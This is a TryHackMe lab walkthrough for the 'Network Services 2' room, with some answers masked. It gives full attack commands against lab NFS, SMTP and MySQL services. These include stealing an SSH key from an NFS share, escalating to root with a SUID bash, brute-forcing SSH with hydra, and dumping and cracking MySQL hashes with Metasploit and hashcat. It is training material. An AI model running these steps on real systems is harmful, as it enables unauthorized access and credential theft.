# TryHackMe Network Services 2 Walkthrough

## Network Services 2 Walkthrough

### room/networkservices2

Link: [TryHackMe: Network Services 2](https://tryhackme.com/room/networkservices2)

### NFS - Network File System

#### Intro

This room is a sequel to the first network services room. Similarly, it will explore a few more common Network Service vulnerabilities and misconfigurations that you're likely to find in CTFs, and some penetration test scenarios.

I would encourage you to complete the first network services room: [Network Services](https://tryhackme.com/room/networkservices) before attempting this one.

#### Understanding NFS

What does NFS stand for?

- Network File System

What process allows an NFS client to interact with a remote directory as though it was a physical device?

- Mounting

What does NFS use to represent files and directories on the server?

- File Handle

What protocol does NFS use to communicate between the server and client?

- RPC

What two pieces of user data does the NFS server take as parameters for controlling user permissions? (Format: parameter 1 / parameter 2)

- user id / group id

Can a Windows NFS server share files with a Linux client? (Y/N)

- Y

Can a Linux NFS server share files with a MacOS client? (Y/N)

- Y

What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.

- Google 'Network File System latest version'. It is even mentioned on Wikipedia.

#### Enumerating NFS

Conduct a thorough port scan of your choosing, how many ports are open?

- `nmap -A -p- {ROOM_IP}`

Which port contains the service we're looking to enumerate?

- Look for `nfs_acl` in the listed ports.

Now, use `/usr/sbin/showmount -e {ROOM_IP}` to list the NFS shares, what is the name of the visible share?

- Run the command and you will see it listed.
- `/***e`

Time to mount the share to our local machine!

First, use `mkdir /tmp/mount` to create a directory on your machine to mount the share to. This is in the `/tmp` directory, so be aware that it will be removed on restart.

Then, use the `mount` command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share - what is the name of the folder inside?

- `sudo mount -t nfs {ROOM_IP}:home /tmp/mount/ -nolock`
- Then `cd /tmp/mount` to go to the `mount` directory and then `ls -la` shows a directory inside called `ca*******`.

Have a look inside this directory, look at the files. Looks like we're inside a user's home directory...

- `cd ca*******`

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde**rs** could cont**a**in keys that would give us remote access to the server?

- `ls -la`
- `.**h` directory has `**_***` file which we can use to **securely** access remote server.

Which of these keys is most useful to us?

- `**_***`

Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".

- `cp **_*** /home/kali/`
- Then `cd /home/kali` and `chmod 600 **_***`.

Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.

Can we log into the machine using `ssh -i <key-file> <username>@<ip>`? (Y/N)

- `ssh -i **_*** ca*******@{ROOM_IP}`

#### Exploiting NFS

Lets do this!

First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

- `cd /tmp/mount`

Download the [bash](https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) executable to your `Downloads` directory. Then from `/tmp/mount` directory, run `cp ~/Downloads/bash .` to copy the bash executable to the NFS share. The **copied bash shell must be owned by a root** user, you can set this using: `sudo chown root bash`.

Now, we're going to **add the SUID bit permission to the bash executable** we just copied to the share using `sudo chmod +[permission] bash`. What letter do we use to set the SUID bit set using chmod?

- `s`

Let's do a sanity check, let's check the permissions of the `bash` executable using `ls -la bash`. What does the permission set look like? Make sure that it ends with `-sr-x`.

- It looks like: `-rwSr-Sr--`
- Now run `sudo chmod +x bash` to make it executable and again `ls -la bash`.
- Now it should look like: `-rwsr-sr-x`

Now, SSH into the machine as the user `ca*******` with SSH (`ssh -i id_rsa ca*******@{ROOM_IP}`). List the directory (`la -la`) to make sure the bash executable is there. Now, the moment of truth.
Lets run it with `./bash -p`. The **`-p` persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions**.

Great! If all's gone well you should have a shell as root! What's the root flag?

- `cd ../..` to go up. Then `ls`, then `cd root` and `ls` to list all the files and folders.
- There's a `root.txt` file. `cat root.txt` - `THM{*************}`.

### SMTP - Simple Mail Transfer Protocol

#### Understanding SMTP, POP, IMAP

What does SMTP stand for?

- Simple Mail Transfer Protocol

What does SMTP handle the sending of?

- emails

What is the first step in the SMTP process?

- Go through [SMTP Protocol Explained](https://www.afternerd.com/blog/smtp/) or read point #1 in **How does SMTP work?**.

What is the default SMTP port?

- Read point #1 in **How does SMTP work?**

Where does the SMTP server send the email if the recipient's server is not available?

- Read point #4 in **How does SMTP work?**.

On what server does the Email ultimately end up on?

- POP/IMAP

Can a Linux machine run an SMTP server? (Y/N)

- Read **What runs SMTP?**.

Can a Windows machine run an SMTP server? (Y/N)

- Read **What runs SMTP?**.

#### Enumerating SMTP

- `nmap -sCV {ROOM_IP}`

Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

- `msfco*****`

If you would like some more help, or practice using Metasploit, Darkstar has an amazing room on Metasploit that you can check out here: [RP: MetaSploit](https://tryhackme.com/room/rpmetasploit)

Let's search for the module `smtp_version`, what's it's full module name?

- `search smtp_version` inside MetaSploit terminal and copy paste its path.

Great, now select the module and list the options. How do we do this?

- `use 0` (It was `0` in my case, otherwise could be a different number if more modules are listed)
- Run `options` or `show options` to see what options we need to set to run this module.

Have a look through the options, does everything seem correct? What is the option we need to set?

- `RHOSTS`
- `set RHOSTS {TARGET/ROOM_IP}`

Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

- `run` OR `exploit` to run the exploit.
- `****smtp.ho**`

What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

- `****fix`

Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module `smtp_enum`, what's it's full module name (path)?

- `search smtp_enum`

We're going to be using the **`top-usernames-shortlist.txt` wordlist** from the Usernames subsection of **seclists** (`/usr/share/seclists/Usernames` if you have it installed. Or run `locate seclists`).

Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: `sudo apt install seclists`. Alternatively, you can download the repository from here: [SecLists GitHub](https://github.com/danielmiessler/SecLists).

What option do we need to set to the wordlist's path?

- After `search smtp_enum`, select the module with `use {MODULE_NUMBER}`.
- Then run `show options` or `options` and check which one is for wordlist.
- `****_FILE`

Once we've set this option, what is the other essential paramater we need to set?

- `show options` and check what else we need to set.
- `R***T*`

Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!

- `set THREADS 16`
- `exploit`

Okay! Now that's finished, what username is returned?

- `*************`

#### Exploiting SMTP

We got `{USERNAME}` in the previous step.

`hydra -t 16 -l {USERNAME} -P /usr/share/wordlists/rockyou.txt -vV {ROOM_IP} ssh`

What is the password of the user we found during our enumeration stage?

- `a***a****`

Great! Now, let's SSH into the server as the user, what is contents of `smtp.txt`.

- `ssh {USERNAME}@{ROOM_IP}` => yes => enter the password we got.
- After logging in, `ls -la` and you will see a file `smtp.txt`. Run `cat smtp.txt` to capture the flag.

### MySQL

#### Understanding MySQL

What type of software is MySQL?

- Relational Database Management System

What language is MySQL based on?

- SQL

What communication model does MySQL use?

- Read under **SQL** point in the provided information.

What is a common application of MySQL?

- Read under **What runs MySQL?** point in the provided information.

What major social network uses MySQL as their back-end database? This will require further research.

- `F*******`

#### Enumerating MySQL

As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

- `nmap -A -p- {ROOM_IP}`
- `**06`

**We are going to assume that you found the credentials: `root:password` while enumerating subdomains of a web server.**

Good, now- we think we have a set of credentials (`root:password`). Let's double check that by manually connecting to the MySQL server. We can do this using the command:

- `mysql -h {ROOM_IP} -u {USERNAME} -p`
- `mysql -h {ROOM_IP} -u root -p`

Okay, we know that our login credentials work. Lets quit out of this session with `exit` and launch up Metasploit.

We're going to be using the `mysql_sql` module.

Search for, select and list the options it needs. What three options do we need to set? (in descending order).

- `search mysql_sql` in Metasploit and select it with `use {MODULE_NUMBER}` (example: `use 0`) command.
- `show options` to see which options we need to set to run this exploit.
- `P*******/R*****/U*******` - these are the three options we need to set.
- `set P******* password`, then `set R***** {ROOM_IP}`, then `set U******* root` (can be done in any order).
- Remember that these values are based on our earlier assumptions where our credentials are: `root:password`.
- Then run `exploit` or `run` command to run the exploit.

Run the exploit. By default it will test with the "select module()" command, what result does this give you?

- Output will be as shown below:

  ```
  {ROOM_IP}:{PORT} - Sending statement: 'select version()'...
  [*] {ROOM_IP}:{PORT} -  | ********ubuntu********* |
  [*] Auxiliary module execution completed
  ```

- `********ubuntu*********`

Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?

- We have to set `SQL` option to `show databases` here so run `set SQL "show databases"` and run `options` to make sure `SQL` options is set to `show databases`.
- Then run `exploit` or `run` command again.
- Output will be similar whats shown below:

  ```
  [*] Running module against {ROOM_IP}
  [*] {ROOM_IP}:{PORT} - Sending statement: 'show databases'...
  [*] {ROOM_IP}:{PORT} -  | ********ion_schema |
  xxxxxxxxxxxxxxxx REDACTED xxxxxxxxxxxxxxxxxx
  [*] Auxiliary module execution completed
  ```

- Check how many databases are returned.

#### Exploiting MySQL

First, let's search for and select the `mysql_schemadump` module. What's the module's full name?

- `search mysql_schemadump`

Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

- `search mysql_schemadump`
- `use {MODULE_NUMBER}`
- `show options` and set all the options we need to set. `set PASSWORD password`, then `set RHOSTS {ROOM_IP}`, then `set USERNAME root`.
- Run `exploit`.
- `x$waits_global_**_*******` - name of the last table that got dumped.

Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the `mysql_hashdump` module. What's the module's full name?

- `search mysql_hashdump`

Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

- `search mysql_hashdump`
- `use {MODULE_NUMBER}`
- `show options` and set all the options we need to set. `set PASSWORD password`, then `set RHOSTS {ROOM_IP}`, then `set USERNAME root`.
- Run `exploit`.

- Check the last username and hash string. You will find the user account you need.
- `*a**`

Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: `bob:\*HASH` to a text file on your local machine called `hash.txt`.

What is the user/hash combination string?

- `*a***:\*EA03189xxxxxxxxx`

Now, we need to crack the password! Let's try **John the Ripper** against it using: `john hash.txt`. What is the password of the user we found?

- You can either use `john` or `hashcat` or [CrackStation](https://crackstation.net/)
- I tried [CrackStation](https://crackstation.net/) first to save time and got the password instantly. But for the sake of cracking, I've mentioned `hashcat` steps below.
- Copy the hash (just the hash i.e. `EA03189xxxxxxxxx`) in a text file. Let's call it `hash.txt`.
- Then run `hashid -m hash.txt` to identify the hash format with `-m` to get hashcat mode. It returns hashcat mode `100` for `SHA-1`. Now we can run `hashcat` to crack it.
- `hashcat -m 100 -w 3 hash.txt /usr/share/wordlists/rockyou.txt`
- `-w 3` flag for faster workload/cracking but will slow down your machine. You can skip it.
- password: `****ie`

Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?

What's the contents of `MySQL.txt`

- Let's try SSH!
- `ssh *a**@{ROOM_IP}` => yes => and then enter the password we cracked earlier (`****ie`).
- `ls -la` shows `MySQL.txt`.
- `cat MySQL.txt` to capture the final flag!

Thank you!

Thanks for taking the time to work through this room. I wish you the best of luck in future.
~ [Polo](https://tryhackme.com/p/PoloMints).
